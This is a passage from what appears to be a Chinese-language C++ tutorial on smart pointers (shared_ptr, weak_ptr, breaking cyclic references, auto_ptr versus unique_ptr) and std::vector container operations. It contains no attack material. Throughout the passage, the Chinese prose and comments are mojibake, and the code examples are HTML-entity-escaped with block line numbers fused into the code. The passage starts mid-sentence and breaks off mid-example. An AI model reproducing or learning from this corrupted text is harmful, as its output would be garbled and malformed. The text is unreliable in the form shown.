å¼•ç”¨è®¡æ•°ï¼Œé”€æ¯æˆ–é‡ç½® shared_ptr ä¼šå‡å°‘å¼•ç”¨è®¡æ•°ã€‚ 1234567891011std::shared_ptr&lt;int&gt; sp1 = std::make_shared&lt;int&gt;(100);std::cout &lt;&lt; &quot;sp1 use_count: &quot; &lt;&lt; sp1.use_count() &lt;&lt; std::endl; // è¾“å‡º 1std::shared_ptr&lt;int&gt; sp2 = sp1; // å¤åˆ¶ï¼Œå¼•ç”¨è®¡æ•°å¢åŠ std::cout &lt;&lt; &quot;sp1 use_count: &quot; &lt;&lt; sp1.use_count() &lt;&lt; std::endl; // è¾“å‡º 2std::cout &lt;&lt; &quot;sp2 use_count: &quot; &lt;&lt; sp2.use_count() &lt;&lt; std::endl; // è¾“å‡º 2sp1.reset(); // sp1 ä¸å†æŒ‡å‘å¯¹è±¡ï¼Œå¼•ç”¨è®¡æ•°å‡å°‘std::cout &lt;&lt; &quot;sp1 reset. sp2 use_count: &quot; &lt;&lt; sp2.use_count() &lt;&lt; std::endl; // è¾“å‡º 1// å½“ sp2 ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼Œå¼•ç”¨è®¡æ•°å˜ä¸º 0ï¼Œå¯¹è±¡è¢«åˆ é™¤ ä½¿ç”¨: ä¸ unique_ptr ç±»ä¼¼ï¼Œä½¿ç”¨ * å’Œ -&gt;ã€‚ å…¶ä»–æ“ä½œ: get(): è¿”å›åŸå§‹æŒ‡é’ˆã€‚ reset() / reset(p): å‡å°‘å½“å‰å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼ˆå¦‚æœä¸º 0 åˆ™åˆ é™¤ï¼‰ï¼Œå¹¶å¯é€‰åœ°æ¥ç®¡æ–°æŒ‡é’ˆ pã€‚ use_count(): è¿”å›å½“å‰çš„å¼•ç”¨è®¡æ•°å€¼ï¼ˆä¸»è¦ç”¨äºè°ƒè¯•ï¼‰ã€‚ å¾ªç¯å¼•ç”¨é—®é¢˜: å¦‚æœä¸¤ä¸ªå¯¹è±¡é€šè¿‡ shared_ptr ç›¸äº’å¼•ç”¨ï¼Œå®ƒä»¬çš„å¼•ç”¨è®¡æ•°æ°¸è¿œä¸ä¼šå˜ä¸º 0ï¼Œå³ä½¿æ²¡æœ‰å¤–éƒ¨æŒ‡é’ˆæŒ‡å‘å®ƒä»¬ï¼Œä¹Ÿä¼šå¯¼è‡´å†…å­˜æ³„æ¼ã€‚ 12345678910111213141516171819202122232425struct NodeB; // å‰å‘å£°æ˜struct NodeA &#123; std::shared_ptr&lt;NodeB&gt; ptrB; ~NodeA() &#123; std::cout &lt;&lt; &quot;NodeA destroyed\\n&quot;; &#125;&#125;;struct NodeB &#123; std::shared_ptr&lt;NodeA&gt; ptrA; ~NodeB() &#123; std::cout &lt;&lt; &quot;NodeB destroyed\\n&quot;; &#125;&#125;;int main() &#123; std::shared_ptr&lt;NodeA&gt; pa = std::make_shared&lt;NodeA&gt;(); std::shared_ptr&lt;NodeB&gt; pb = std::make_shared&lt;NodeB&gt;(); pa-&gt;ptrB = pb; // pa æŒ‡å‘ pb pb-&gt;ptrA = pa; // pb æŒ‡å‘ pa (å½¢æˆå¾ªç¯å¼•ç”¨) std::cout &lt;&lt; &quot;pa use_count: &quot; &lt;&lt; pa.use_count() &lt;&lt; std::endl; // è¾“å‡º 2 (pa å’Œ pb-&gt;ptrA) std::cout &lt;&lt; &quot;pb use_count: &quot; &lt;&lt; pb.use_count() &lt;&lt; std::endl; // è¾“å‡º 2 (pb å’Œ pa-&gt;ptrB) // å½“ pa å’Œ pb ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼Œå¼•ç”¨è®¡æ•°éƒ½åªå‡åˆ° 1ï¼Œææ„å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨ï¼Œå†…å­˜æ³„æ¼ï¼ return 0;&#125; è§£å†³æ–¹æ¡ˆ: ä½¿ç”¨ std::weak_ptr æ‰“ç ´å¾ªç¯ã€‚ std::weak_ptrweak_ptr ç”¨äºâ€œè§‚å¯Ÿâ€ç”± shared_ptr ç®¡ç†çš„å¯¹è±¡ï¼Œä½†å®ƒæœ¬èº«ä¸æ‹¥æœ‰å¯¹è±¡ï¼Œä¹Ÿä¸å½±å“å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸï¼ˆä¸æ”¹å˜å¼•ç”¨è®¡æ•°ï¼‰ã€‚ åˆ›å»º: åªèƒ½ä» shared_ptr æˆ–å¦ä¸€ä¸ª weak_ptr åˆ›å»ºã€‚ 12345std::shared_ptr&lt;int&gt; sp = std::make_shared&lt;int&gt;(10);std::weak_ptr&lt;int&gt; wp = sp; // wp è§‚å¯Ÿ sp ç®¡ç†çš„å¯¹è±¡std::cout &lt;&lt; &quot;sp use_count: &quot; &lt;&lt; sp.use_count() &lt;&lt; std::endl; // è¾“å‡º 1std::cout &lt;&lt; &quot;wp use_count: &quot; &lt;&lt; wp.use_count() &lt;&lt; std::endl; // è¾“å‡º 1 (weak_ptr::use_count è¿”å›çš„æ˜¯ shared_ptr çš„è®¡æ•°) ä½¿ç”¨: expired(): æ£€æŸ¥æ‰€è§‚å¯Ÿçš„å¯¹è±¡æ˜¯å¦å·²è¢«é”€æ¯ï¼ˆå¯¹åº”çš„ shared_ptr å¼•ç”¨è®¡æ•°æ˜¯å¦ä¸º 0ï¼‰ã€‚ lock(): å…³é”®æ–¹æ³•ã€‚å°è¯•è·å–ä¸€ä¸ªæŒ‡å‘æ‰€è§‚å¯Ÿå¯¹è±¡çš„ shared_ptrã€‚ å¦‚æœå¯¹è±¡ä»ç„¶å­˜åœ¨ï¼Œè¿”å›ä¸€ä¸ªæœ‰æ•ˆçš„ shared_ptrï¼ˆå¹¶å¢åŠ å¼•ç”¨è®¡æ•°ï¼‰ã€‚ å¦‚æœå¯¹è±¡å·²è¢«é”€æ¯ï¼Œè¿”å›ä¸€ä¸ªç©ºçš„ shared_ptrã€‚è¿™æ˜¯è®¿é—® weak_ptr æŒ‡å‘å¯¹è±¡çš„å®‰å…¨æ–¹å¼ã€‚ 1234567891011121314151617181920if (wp.expired()) &#123; std::cout &lt;&lt; &quot;Object observed by wp is expired.\\n&quot;;&#125; else &#123; std::shared_ptr&lt;int&gt; locked_sp = wp.lock(); // å°è¯•è·å– shared_ptr if (locked_sp) &#123; // æ£€æŸ¥æ˜¯å¦æˆåŠŸè·å– std::cout &lt;&lt; &quot;Object still alive. Value: &quot; &lt;&lt; *locked_sp &lt;&lt; std::endl; std::cout &lt;&lt; &quot;use_count after lock: &quot; &lt;&lt; locked_sp.use_count() &lt;&lt; std::endl; // å¼•ç”¨è®¡æ•°å¢åŠ  &#125; else &#123; std::cout &lt;&lt; &quot;Object expired between check and lock.\\n&quot;; // å¯èƒ½å‘ç”Ÿ (å¤šçº¿ç¨‹) &#125; // locked_sp ç¦»å¼€ä½œç”¨åŸŸï¼Œå¼•ç”¨è®¡æ•°å‡å°‘&#125;sp.reset(); // åŸå§‹ shared_ptr é‡Šæ”¾å¯¹è±¡std::cout &lt;&lt; &quot;Original shared_ptr reset.\\n&quot;;std::shared_ptr&lt;int&gt; locked_sp_after_reset = wp.lock();if (!locked_sp_after_reset) &#123; std::cout &lt;&lt; &quot;weak_ptr lock() failed after object destruction.\\n&quot;;&#125; è§£å†³å¾ªç¯å¼•ç”¨: åœ¨å¾ªç¯å¼•ç”¨çš„åœºæ™¯ä¸­ï¼Œè®©å…¶ä¸­ä¸€ä¸ªæŒ‡é’ˆï¼ˆæˆ–ä¸¤ä¸ªï¼‰æˆä¸º weak_ptrã€‚ 12345678910111213141516171819202122232425struct NodeB_weak;struct NodeA_weak &#123; std::shared_ptr&lt;NodeB_weak&gt; ptrB; // NodeA å¼ºå¼•ç”¨ NodeB ~NodeA_weak() &#123; std::cout &lt;&lt; &quot;NodeA_weak destroyed\\n&quot;; &#125;&#125;;struct NodeB_weak &#123; std::weak_ptr&lt;NodeA_weak&gt; ptrA; // NodeB å¼±å¼•ç”¨ NodeA (æ‰“ç ´å¾ªç¯) ~NodeB_weak() &#123; std::cout &lt;&lt; &quot;NodeB_weak destroyed\\n&quot;; &#125;&#125;;int main() &#123; std::shared_ptr&lt;NodeA_weak&gt; pa = std::make_shared&lt;NodeA_weak&gt;(); std::shared_ptr&lt;NodeB_weak&gt; pb = std::make_shared&lt;NodeB_weak&gt;(); pa-&gt;ptrB = pb; pb-&gt;ptrA = pa; // pa èµ‹å€¼ç»™ weak_ptrï¼Œä¸å¢åŠ  pa çš„å¼•ç”¨è®¡æ•° std::cout &lt;&lt; &quot;pa use_count: &quot; &lt;&lt; pa.use_count() &lt;&lt; std::endl; // è¾“å‡º 1 std::cout &lt;&lt; &quot;pb use_count: &quot; &lt;&lt; pb.use_count() &lt;&lt; std::endl; // è¾“å‡º 1 // å½“ pa å’Œ pb ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼Œå¼•ç”¨è®¡æ•°éƒ½èƒ½é™ä¸º 0ï¼Œå¯¹è±¡è¢«æ­£ç¡®é”€æ¯ return 0; // è¾“å‡º NodeA_weak destroyed å’Œ NodeB_weak destroyed&#125; 16.2.2 æœ‰å…³æ™ºèƒ½æŒ‡é’ˆçš„æ³¨æ„äº‹é¡¹ ä¸è¦æ··ç”¨æ™ºèƒ½æŒ‡é’ˆå’ŒåŸå§‹æŒ‡é’ˆ: é¿å…å°† get() è¿”å›çš„åŸå§‹æŒ‡é’ˆä¼ é€’ç»™å¦ä¸€ä¸ªæ™ºèƒ½æŒ‡é’ˆæˆ–æ‰‹åŠ¨ deleteã€‚ ä¼˜å…ˆä½¿ç”¨ make_unique å’Œ make_shared: æ›´å®‰å…¨ã€å¯èƒ½æ›´é«˜æ•ˆã€‚ shared_ptr çš„æ€§èƒ½å¼€é”€: å¼•ç”¨è®¡æ•°æ˜¯åŸå­æ“ä½œï¼Œåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹æœ‰ä¸€å®šå¼€é”€ã€‚shared_ptr å¯¹è±¡æœ¬èº«ä¹Ÿæ¯” unique_ptr æˆ–åŸå§‹æŒ‡é’ˆå¤§ï¼ˆéœ€è¦å­˜å‚¨æŒ‡å‘æ§åˆ¶å—çš„æŒ‡é’ˆï¼‰ã€‚ this æŒ‡é’ˆé—®é¢˜: ä¸è¦åœ¨ç±»çš„æ„é€ å‡½æ•°ä¸­å°† this æŒ‡é’ˆç›´æ¥ä¼ é€’ç»™ shared_ptr çš„æ„é€ å‡½æ•°ã€‚å¦‚æœéœ€è¦è®©ç±»è‡ªèº«èƒ½å¤Ÿåˆ›å»ºæŒ‡å‘è‡ªå·±çš„ shared_ptrï¼Œåº”ç»§æ‰¿è‡ª std::enable_shared_from_this&lt;YourClass&gt; å¹¶ä½¿ç”¨ shared_from_this() æ–¹æ³•ã€‚ 16.2.3 unique_ptr ä¸ºä½•ä¼˜äº auto_ptrC++98 å¼•å…¥äº† std::auto_ptrï¼Œå®ƒæ˜¯ unique_ptr çš„å‰èº«ï¼Œä¹Ÿè¯•å›¾å®ç°ç‹¬å æ‰€æœ‰æƒã€‚ä½† auto_ptr æœ‰ä¸€ä¸ªä¸¥é‡çš„è®¾è®¡ç¼ºé™·ï¼šå®ƒçš„å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ä¼šè½¬ç§»æ‰€æœ‰æƒã€‚ 12std::auto_ptr&lt;int&gt; ap1(new int(10));std::auto_ptr&lt;int&gt; ap2 = ap1; // ï¼ï¼æ‰€æœ‰æƒä» ap1 è½¬ç§»åˆ° ap2ï¼Œap1 å˜ä¸ºæ— æ•ˆï¼ï¼ è¿™ç§éšå¼çš„ã€ç ´åæ€§çš„å¤åˆ¶è¡Œä¸ºéå¸¸å±é™©ï¼Œå°¤å…¶æ˜¯åœ¨å°† auto_ptr æ”¾å…¥å®¹å™¨æˆ–ä½œä¸ºå‡½æ•°å‚æ•°æŒ‰å€¼ä¼ é€’æ—¶ï¼Œä¼šå¯¼è‡´æ„å¤–çš„æ‰€æœ‰æƒä¸¢å¤±ã€‚ C++11 å¼•å…¥äº†ç§»åŠ¨è¯­ä¹‰ï¼Œä½¿å¾— unique_ptr å¯ä»¥é€šè¿‡æ˜¾å¼çš„ std::move æ¥å®‰å…¨åœ°è½¬ç§»æ‰€æœ‰æƒï¼ŒåŒæ—¶ç¦æ­¢äº†å¤åˆ¶æ“ä½œï¼Œä»è€Œé¿å…äº† auto_ptr çš„é—®é¢˜ã€‚ auto_ptr å·²åœ¨ C++11 ä¸­è¢«åºŸå¼ƒï¼Œå¹¶åœ¨ C++17 ä¸­è¢«ç§»é™¤ã€‚åº”å§‹ç»ˆä½¿ç”¨ unique_ptr æ›¿ä»£å®ƒã€‚ 16.2.4 é€‰æ‹©æ™ºèƒ½æŒ‡é’ˆ é»˜è®¤é€‰æ‹© std::unique_ptr: å½“ä½ éœ€è¦ç®¡ç†ä¸€ä¸ªåŠ¨æ€åˆ†é…çš„èµ„æºï¼Œå¹¶ä¸”ä¸éœ€è¦å…±äº«å…¶æ‰€æœ‰æƒæ—¶ï¼Œunique_ptr æ˜¯æœ€ç®€å•ã€æœ€é«˜æ•ˆçš„é€‰æ‹©ã€‚ ä½¿ç”¨ std::shared_ptr: å½“èµ„æºéœ€è¦è¢«å¤šä¸ªæ‰€æœ‰è€…å…±äº«ç”Ÿå‘½å‘¨æœŸæ—¶ï¼ˆä¾‹å¦‚ï¼Œåœ¨æ•°æ®ç»“æ„ä¸­å¤šä¸ªéƒ¨åˆ†å¯èƒ½å¼•ç”¨åŒä¸€ä¸ªèŠ‚ç‚¹ï¼Œæˆ–è€…å›è°ƒå‡½æ•°éœ€è¦ç¡®ä¿æŸä¸ªå¯¹è±¡åœ¨å…¶æ‰§è¡ŒæœŸé—´å­˜æ´»ï¼‰ã€‚ ä½¿ç”¨ std::weak_ptr: å½“ä½ éœ€è¦è§‚å¯Ÿä¸€ä¸ªç”± shared_ptr ç®¡ç†çš„å¯¹è±¡ï¼Œä½†ä¸æƒ³å½±å“å…¶ç”Ÿå‘½å‘¨æœŸæ—¶ï¼Œç‰¹åˆ«æ˜¯ä¸ºäº†æ‰“ç ´ shared_ptr ä¹‹é—´çš„å¾ªç¯å¼•ç”¨ã€‚ æ™ºèƒ½æŒ‡é’ˆæ˜¯ç°ä»£ C++ ä¸­ç®¡ç†åŠ¨æ€èµ„æºçš„æ ¸å¿ƒå·¥å…·ï¼Œæå¤§åœ°æé«˜äº†ä»£ç çš„å®‰å…¨æ€§å’Œç®€æ´æ€§ã€‚ 16.3 æ ‡å‡†æ¨¡æ¿åº“ï¼ˆSTLï¼‰æ ‡å‡†æ¨¡æ¿åº“ (Standard Template Library, STL) æ˜¯ C++ æ ‡å‡†åº“çš„ä¸€ä¸ªé‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå®ƒæä¾›äº†ä¸€å¥—é€šç”¨çš„æ¨¡æ¿ç±»å’Œå‡½æ•°ï¼Œç”¨äºå®ç°å¸¸ç”¨çš„æ•°æ®ç»“æ„å’Œç®—æ³•ã€‚STL çš„æ ¸å¿ƒæ€æƒ³æ˜¯**æ³›å‹ç¼–ç¨‹ (Generic Programming)**ï¼Œå³ä»£ç ç‹¬ç«‹äºç‰¹å®šçš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥åº”ç”¨äºå¤šç§ç±»å‹ã€‚ STL ä¸»è¦ç”±ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶æ„æˆï¼š å®¹å™¨ (Containers): ç”¨äºå­˜å‚¨æ•°æ®çš„æ¨¡æ¿ç±»ã€‚ä¾‹å¦‚ vector, list, deque, set, map ç­‰ã€‚å®ƒä»¬å°è£…äº†æ•°æ®ç»“æ„ï¼Œå¹¶æä¾›äº†ç®¡ç†å…ƒç´ çš„æ–¹æ³•ã€‚ ç®—æ³• (Algorithms): ç”¨äºå¤„ç†å®¹å™¨ä¸­æ•°æ®çš„æ¨¡æ¿å‡½æ•°ã€‚ä¾‹å¦‚ sort, find, copy, for_each ç­‰ã€‚è¿™äº›ç®—æ³•é€šå¸¸é€šè¿‡è¿­ä»£å™¨ä½œç”¨äºå®¹å™¨ä¸­çš„å…ƒç´ èŒƒå›´ã€‚ è¿­ä»£å™¨ (Iterators): è¡Œä¸ºç±»ä¼¼äºæŒ‡é’ˆçš„å¯¹è±¡ï¼Œç”¨äºéå†å®¹å™¨ä¸­çš„å…ƒç´ ï¼Œå¹¶ä½œä¸ºè¿æ¥å®¹å™¨å’Œç®—æ³•çš„æ¡¥æ¢ã€‚ æœ¬èŠ‚å°†é‡ç‚¹ä»‹ç» STL ä¸­æœ€å¸¸ç”¨çš„å®¹å™¨ä¹‹ä¸€ï¼švectorï¼Œä»¥åŠé€‚ç”¨äºå¤šç§å®¹å™¨çš„é€šç”¨æ“ä½œã€‚ 16.3.1 æ¨¡æ¿ç±» vectorstd::vector æ˜¯ä¸€ä¸ªæ¨¡æ¿ç±»ï¼Œå®šä¹‰åœ¨ &lt;vector&gt; å¤´æ–‡ä»¶ä¸­ã€‚å®ƒå®ç°äº†ä¸€ä¸ª**åŠ¨æ€æ•°ç»„ (Dynamic Array)**ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è‡ªåŠ¨å¢é•¿æˆ–æ”¶ç¼©å¤§å°ã€‚ ç‰¹ç‚¹: åŠ¨æ€å¤§å°: å¯ä»¥åœ¨è¿è¡Œæ—¶æ·»åŠ æˆ–åˆ é™¤å…ƒç´ ï¼Œvector ä¼šè‡ªåŠ¨ç®¡ç†å†…å­˜ã€‚ éšæœºè®¿é—®: æ”¯æŒé€šè¿‡ç´¢å¼• ([] æˆ– at()) å¿«é€Ÿè®¿é—®ä»»ä½•ä½ç½®çš„å…ƒç´ ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(1)ã€‚ è¿ç»­å­˜å‚¨: å…ƒç´ åœ¨å†…å­˜ä¸­æ˜¯è¿ç»­å­˜å‚¨çš„ï¼Œè¿™ä½¿å¾—é€šè¿‡æŒ‡é’ˆæˆ–è¿­ä»£å™¨è¿›è¡Œéå†éå¸¸é«˜æ•ˆï¼Œå¹¶èƒ½ä¸éœ€è¦è¿ç»­å†…å­˜çš„ C é£æ ¼ API å…¼å®¹ã€‚ å°¾éƒ¨æ’å…¥/åˆ é™¤é«˜æ•ˆ: åœ¨æœ«å°¾æ·»åŠ  (push_back) æˆ–åˆ é™¤ (pop_back) å…ƒç´ é€šå¸¸å¾ˆé«˜æ•ˆï¼ˆæ‘Šé”€æ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼‰ã€‚ ä¸­é—´æ’å…¥/åˆ é™¤ä½æ•ˆ: åœ¨ä¸­é—´æˆ–å¼€å¤´æ’å…¥æˆ–åˆ é™¤å…ƒç´ å¯èƒ½éœ€è¦ç§»åŠ¨åç»­æ‰€æœ‰å…ƒç´ ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(N)ã€‚ åŸºæœ¬ç”¨æ³•: 123456789101112131415161718192021222324252627282930#include &lt;vector&gt; // åŒ…å« vector å¤´æ–‡ä»¶#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; // åˆ›å»º vector å¯¹è±¡ std::vector&lt;int&gt; scores; // åˆ›å»ºä¸€ä¸ªç©ºçš„ int å‘é‡ std::vector&lt;double&gt; lengths(10); // åˆ›å»ºåŒ…å« 10 ä¸ª double å…ƒç´ çš„å‘é‡ï¼Œé»˜è®¤åˆå§‹åŒ–ä¸º 0.0 std::vector&lt;std::string&gt; names(5, &quot;Unknown&quot;); // åˆ›å»ºåŒ…å« 5 ä¸ª string å…ƒç´ ï¼Œéƒ½åˆå§‹åŒ–ä¸º &quot;Unknown&quot; // ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ (C++11) std::vector&lt;int&gt; numbers = &#123;10, 20, 30, 40, 50&#125;; std::vector&lt;char&gt; vowels &#123;&#x27;a&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;u&#x27;&#125;; // æ·»åŠ å…ƒç´ åˆ°æœ«å°¾ scores.push_back(95); scores.push_back(88); scores.push_back(76); // scores ç°åœ¨æ˜¯ &#123;95, 88, 76&#125; // è®¿é—®å…ƒç´  std::cout &lt;&lt; &quot;First score: &quot; &lt;&lt; scores[0] &lt;&lt; std::endl; // ä½¿ç”¨ [] std::cout &lt;&lt; &quot;Second score: &quot; &lt;&lt; scores.at(1) &lt;&lt; std::endl; // ä½¿ç”¨ at() (å¸¦è¾¹ç•Œæ£€æŸ¥) scores[0] = 98; // ä¿®æ”¹å…ƒç´  // è·å–å¤§å° std::cout &lt;&lt; &quot;Number of scores: &quot; &lt;&lt; scores.size() &lt;&lt; std::endl; // è¾“å‡º 3 std::cout &lt;&lt; &quot;Number of names: &quot; &lt;&lt; names.size() &lt;&lt; std::endl; // è¾“å‡º 5 return 0;&#125; 16.3.2 å¯å¯¹å®¹å™¨æ‰§è¡Œçš„æ“ä½œè®¸å¤š STL å®¹å™¨ï¼ˆåŒ…æ‹¬ vectorï¼‰éƒ½æ”¯æŒä¸€ç»„å¸¸è§çš„æ“ä½œï¼š size(): è¿”å›å®¹å™¨ä¸­å…ƒç´ çš„æ•°é‡ã€‚ç±»å‹é€šå¸¸æ˜¯ size_type (ä¸€ç§æ— ç¬¦å·æ•´å‹)ã€‚ empty(): æ£€æŸ¥å®¹å™¨æ˜¯å¦ä¸ºç©ºã€‚å¦‚æœ size() == 0ï¼Œè¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚ operator[]: é€šè¿‡ç´¢å¼•è®¿é—®å…ƒç´ ï¼ˆä»…é€‚ç”¨äº vector, deque, string, arrayï¼‰ã€‚ä¸è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ã€‚ at(): é€šè¿‡ç´¢å¼•è®¿é—®å…ƒç´ ï¼ˆä»…é€‚ç”¨äº vector, deque, string, arrayï¼‰ã€‚è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼Œè¶Šç•Œæ—¶æŠ›å‡º std::out_of_range å¼‚å¸¸ã€‚ front(): è¿”å›å¯¹ç¬¬ä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ã€‚å®¹å™¨ä¸èƒ½ä¸ºç©ºã€‚ back(): è¿”å›å¯¹æœ€åä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ã€‚å®¹å™¨ä¸èƒ½ä¸ºç©ºã€‚ push_back(value): (ä»…é€‚ç”¨äº vector, deque, list, string) åœ¨å®¹å™¨æœ«å°¾æ·»åŠ ä¸€ä¸ªå€¼ä¸º value çš„å…ƒç´ ã€‚ pop_back(): (ä»…é€‚ç”¨äº vector, deque, list, string) åˆ é™¤å®¹å™¨æœ«å°¾çš„å…ƒç´ ã€‚å®¹å™¨ä¸èƒ½ä¸ºç©ºã€‚ ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;stdexcept&gt; // for out_of_rangeint main() &#123; std::vector&lt;int&gt; data = &#123;1, 2, 3&#125;; if (!data.empty()) &#123; std::cout &lt;&lt; &quot;Size: &quot; &lt;&lt; data.size() &lt;&lt; std::endl; // è¾“å‡º 3 std::cout &lt;&lt; &quot;Front: &quot; &lt;&lt; data.front() &lt;&lt; std::endl; // è¾“å‡º 1 std::cout &lt;&lt; &quot;Back: &quot; &lt;&lt; data.back() &lt;&lt; std::endl; // è¾“å‡º 3 std::cout &lt;&lt; &quot;Element at index 1: &quot; &lt;&lt; data[1] &lt;&lt; std::endl; // è¾“å‡º 2 &#125; data.push_back(4); // data: &#123;1, 2, 3, 4&#125; std::cout &lt;&lt; &quot;After push_back(4), back is: &quot; &lt;&lt; data.back() &lt;&lt; std::endl; // è¾“å‡º 4 data.pop_back(); // data: &#123;1, 2, 3&#125; std::cout &lt;&lt; &quot;After pop_back(), back is: &quot; &lt;&lt; data.back() &lt;&lt; std::endl; // è¾“å‡º 3 try &#123; data.at(1) = 20; // ä¿®æ”¹ç¬¬äºŒä¸ªå…ƒç´  std::cout &lt;&lt; &quot;Element at index 1 (using at): &quot; &lt;&lt; data.at(1) &lt;&lt; std::endl; // è¾“å‡º 20 int val = data.at(5); // è®¿é—®è¶Šç•Œï¼Œå°†æŠ›å‡ºå¼‚å¸¸ &#125; catch (const std::out_of_range&amp; oor) &#123; std::cerr &lt;&lt; &quot;Error: &quot; &lt;&lt; oor.what() &lt;&lt; std::endl; &#125; return 0;&#125; 16.3.3 å¯¹å®¹å™¨å¯æ‰§è¡Œçš„å…¶ä»–æ“ä½œé™¤äº†åŸºæœ¬æ“ä½œï¼ŒSTL å®¹å™¨è¿˜æä¾›äº†å…¶ä»–ä¸€äº›æœ‰ç”¨çš„æ–¹æ³•ï¼Œå…¶ä¸­è®¸å¤šæ¶‰åŠåˆ°**è¿­ä»£å™¨ (Iterators)**ã€‚è¿­ä»£å™¨æ˜¯æ³›åŒ–çš„æŒ‡é’ˆï¼Œç”¨äºæŒ‡å®šå®¹å™¨ä¸­çš„ä½ç½®æˆ–èŒƒå›´ã€‚ è¿­ä»£å™¨è·å–: begin(): è¿”å›æŒ‡å‘å®¹å™¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„è¿­ä»£å™¨ã€‚ end(): è¿”å›æŒ‡å‘å®¹å™¨æœ«å°¾ä¹‹å (past-the-end) ä½ç½®çš„è¿­ä»£å™¨ã€‚å®ƒä¸æŒ‡å‘ä»»ä½•æœ‰æ•ˆå…ƒç´ ï¼Œå¸¸ç”¨äºæ ‡è®°èŒƒå›´çš„ç»“æŸã€‚ rbegin(), rend(): è¿”å›åå‘è¿­ä»£å™¨ï¼Œç”¨äºä»åå‘å‰éå†ã€‚ cbegin(), cend(), crbegin(), crend() (C++11): è¿”å› const è¿­ä»£å™¨ï¼Œç”¨äºåªè¯»è®¿é—®ã€‚ æ’å…¥ (insert()): åœ¨æŒ‡å®šä½ç½®æ’å…¥å…ƒç´ ã€‚éœ€è¦ä¸€ä¸ªæŒ‡å‘æ’å…¥ä½ç½®çš„è¿­ä»£å™¨ã€‚ insert(iterator pos, const value_type&amp; val): åœ¨ pos ä¹‹å‰æ’å…¥ valã€‚è¿”å›æŒ‡å‘æ–°æ’å…¥å…ƒç´ çš„è¿­ä»£å™¨ã€‚ insert(iterator pos, size_type n, const value_type&amp; val): åœ¨ pos ä¹‹å‰æ’å…¥ n ä¸ª valã€‚ insert(iterator pos, InputIt first, InputIt last): åœ¨ pos ä¹‹å‰æ’å…¥æ¥è‡ªè¿­ä»£å™¨èŒƒå›´ [first, last) çš„å…ƒç´ ã€‚ åˆ é™¤ (erase()): åˆ é™¤æŒ‡å®šä½ç½®æˆ–èŒƒå›´çš„å…ƒç´ ã€‚éœ€è¦è¿­ä»£å™¨ã€‚ erase(iterator pos): åˆ é™¤ pos æŒ‡å‘çš„å…ƒç´ ã€‚è¿”å›æŒ‡å‘è¢«åˆ é™¤å…ƒç´ ä¹‹åå…ƒç´ çš„è¿­ä»£å™¨ã€‚ erase(iterator first, iterator last): åˆ é™¤èŒƒå›´ [first, last) å†…çš„å…ƒç´ ã€‚è¿”å›æŒ‡å‘æœ€åä¸€ä¸ªè¢«åˆ é™¤å…ƒç´ ä¹‹åå…ƒç´ çš„è¿­ä»£å™¨ã€‚ æ¸…ç©º (clear()): åˆ é™¤å®¹å™¨ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚size() å˜ä¸º 0ã€‚ äº¤æ¢ (swap()): c1.swap(c2) æˆ– std::swap(c1, c2)ã€‚é«˜æ•ˆåœ°äº¤æ¢ä¸¤ä¸ªå®¹å™¨çš„å†…å®¹ã€‚å¯¹äº vector ç­‰å®¹å™¨ï¼Œé€šå¸¸åªäº¤æ¢å†…éƒ¨æŒ‡é’ˆå’Œå¤§å°ä¿¡æ¯ï¼Œé€Ÿåº¦å¾ˆå¿«ã€‚ èµ‹å€¼ (assign()): æ›¿æ¢å®¹å™¨çš„å…¨éƒ¨å†…å®¹ã€‚ assign(size_type n, const value_type&amp; val): èµ‹å€¼ä¸º n ä¸ª valã€‚ assign(InputIt first, InputIt last): èµ‹å€¼ä¸ºæ¥è‡ªè¿­ä»£å™¨èŒƒå›´ [first, last) çš„å…ƒç´ ã€‚ assign(initializer_list&lt;value_type&gt; il) (C++11): ä»åˆå§‹åŒ–åˆ—è¡¨èµ‹å€¼ã€‚ å®¹é‡ç®¡ç† (ä¸»è¦ç”¨äº vector, string, deque): capacity(): è¿”å›å½“å‰å·²åˆ†é…å†…å­˜èƒ½å¤Ÿå®¹çº³çš„å…ƒç´ æ•°é‡ã€‚ reserve(n): è¯·æ±‚å°†å®¹é‡å¢åŠ åˆ°è‡³å°‘ nã€‚å¦‚æœ n å¤§äºå½“å‰å®¹é‡ï¼Œå¯èƒ½å‘ç”Ÿå†…å­˜é‡æ–°åˆ†é…ï¼ˆè¿™ä¼šå¯¼è‡´æ‰€æœ‰è¿­ä»£å™¨ã€æŒ‡é’ˆå’Œå¼•ç”¨å¤±æ•ˆï¼‰ã€‚ shrink_to_fit() (C++11): è¯·æ±‚å‡å°‘å®¹é‡ä»¥åŒ¹é… size()ã€‚ä¸ä¿è¯ä¸€å®šå‡å°‘ã€‚ ç¤ºä¾‹ (ä½¿ç”¨è¿­ä»£å™¨): 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;list&gt;int main() &#123; std::vector&lt;int&gt; v = &#123;10, 20, 30, 40, 50&#125;; // è·å–è¿­ä»£å™¨ std::vector&lt;int&gt;::iterator it = v.begin(); // æŒ‡å‘ 10 it += 2; // 